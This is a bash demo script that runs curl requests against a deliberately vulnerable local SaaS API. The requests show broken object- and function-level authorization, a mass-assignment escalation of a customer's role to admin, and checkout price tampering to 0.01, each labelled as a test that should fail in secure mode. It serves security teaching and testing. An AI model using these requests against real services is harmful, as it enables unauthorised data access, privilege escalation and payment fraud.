#!/bin/bash
# ============================================================================
# MiniSub Vulnerable SaaS — Demo Script
# Demonstrates BOLA, BFLA, and Mass Assignment vulnerabilities.
# Run with: bash scripts/demo_vulnerable_api.sh
# ============================================================================

BASE="http://localhost:9000"

echo "============================================"
echo "  MiniSub Vulnerable API — Demo"
echo "============================================"
echo ""

# ── 1. Check health ──────────────────────────────────────────────────────────
echo "[1] Health check..."
curl -s "$BASE/health" | python -m json.tool
echo ""

# ── 2. Login as customer_a ───────────────────────────────────────────────────
echo "[2] Login as customer_a@example.com..."
TOKEN_A=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"customer_a@example.com","password":"Password123"}' \
  | python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "  Token A: ${TOKEN_A:0:20}..."
echo ""

# ── 3. Login as customer_b ───────────────────────────────────────────────────
echo "[3] Login as customer_b@example.com..."
TOKEN_B=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"customer_b@example.com","password":"Password123"}' \
  | python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "  Token B: ${TOKEN_B:0:20}..."
echo ""

# ── 4. BOLA: customer_a reads customer_b's invoice ──────────────────────────
echo "[4] BOLA TEST: customer_a reading customer_b's invoice (inv-002)..."
echo "    Expected: Should FAIL in secure mode, SUCCEED in vulnerable mode."
curl -s -H "Authorization: Bearer $TOKEN_A" "$BASE/invoices/inv-002" | python -m json.tool
echo ""

# ── 5. BFLA: customer_a approves a refund (support-only) ────────────────────
echo "[5] BFLA TEST: customer_a approving refund ref-001 (support-only action)..."
echo "    Expected: Should FAIL in secure mode, SUCCEED in vulnerable mode."
curl -s -X POST -H "Authorization: Bearer $TOKEN_A" "$BASE/support/refunds/ref-001/approve" | python -m json.tool
echo ""

# ── 6. Mass Assignment: customer_a escalates to admin ────────────────────────
echo "[6] MASS ASSIGNMENT TEST: customer_a sets own role to admin..."
echo "    Expected: Should FAIL in secure mode, SUCCEED in vulnerable mode."
curl -s -X PATCH -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  "$BASE/admin/users/user-001" \
  -d '{"role":"admin"}' | python -m json.tool
echo ""

# ── 7. BFLA: customer_a lists all users (admin-only) ────────────────────────
echo "[7] BFLA TEST: customer_a listing all users (admin-only)..."
echo "    Expected: Should FAIL in secure mode, SUCCEED in vulnerable mode."
curl -s -H "Authorization: Bearer $TOKEN_A" "$BASE/admin/users" | python -m json.tool
echo ""

# ── 8. Price Manipulation ────────────────────────────────────────────────────
echo "[8] PRICE MANIPULATION TEST: checkout with custom amount=0.01..."
echo "    Expected: Should FAIL in secure mode, SUCCEED in vulnerable mode."
curl -s -X POST -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  "$BASE/payments/checkout" \
  -d '{"subscription_id":"sub-001","amount":0.01}' | python -m json.tool
echo ""

echo "============================================"
echo "  Demo complete!"
echo "============================================"
